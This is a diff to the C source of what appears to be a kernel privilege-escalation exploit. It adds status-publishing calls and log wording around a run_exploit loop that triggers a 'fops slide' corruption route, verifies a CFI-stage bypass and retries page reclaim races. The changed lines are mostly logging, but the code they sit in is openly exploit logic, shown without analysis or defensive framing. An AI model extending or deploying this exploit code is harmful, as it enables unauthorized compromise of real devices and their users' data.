@@ -28,8 +28,11 @@ static void durable_log_checkpoint(const char *stage) {
   SYSCHK(fflush(NULL));
   SYSCHK(fstat(STDOUT_FILENO, &st));
   if (!S_ISREG(st.st_mode)) {
-    pr_warning("durable log checkpoint skipped stage=%s mode=%#o\n",
-               stage, st.st_mode);
+    const char *type = S_ISFIFO(st.st_mode) ? "fifo" :
+                       (S_ISSOCK(st.st_mode) ? "socket" : "non-regular");
+    pr_info("durable log checkpoint unavailable stage=%s stdout_type=%s "
+            "mode=%#o durability=stream-only exploit_state=unaffected\n",
+            stage, type, st.st_mode);
     return;
   }
   SYSCHK(fsync(STDOUT_FILENO));
@@ -589,6 +592,7 @@ int run_exploit(int argc, char **argv) {
       }
     }
     int triggered = app_trigger_fops_slide_route();
+    if (triggered) app_publish_writer_possible_mutation();
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 #if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
@@ -635,10 +639,11 @@ int run_exploit(int argc, char **argv) {
             "step=%d errno=%d\n",
             attempt, fops_fresh_page_attempts, triggered, verified,
             cfi_last_step, cfi_last_errno);
+    if (verified) app_publish_writer_verified_success();
     if (verified || cfi_dirty_seen) {
       break;
     }
-    pr_info("app fops clean miss; releasing reclaim state before fresh "
+    pr_info("app fops unverified route miss; releasing reclaim state before fresh "
             "page attempt=%d/%d\n",
             attempt, fops_fresh_page_attempts);
   }
@@ -646,11 +651,13 @@ int run_exploit(int argc, char **argv) {
   start_p0_ref_keeper();
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
+    if (triggered) app_publish_writer_possible_mutation();
 #if !defined(APP_S928_STABLE_RACE) || !APP_S928_STABLE_RACE
     pr_info("app fops stage=trigger-return attempt=%d triggered=%d\n",
             attempt, triggered);
 #endif
     int verified = triggered && try_cfi_stage();
+    if (verified) app_publish_writer_verified_success();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
             attempt, triggered, verified, cfi_last_step, cfi_last_errno);
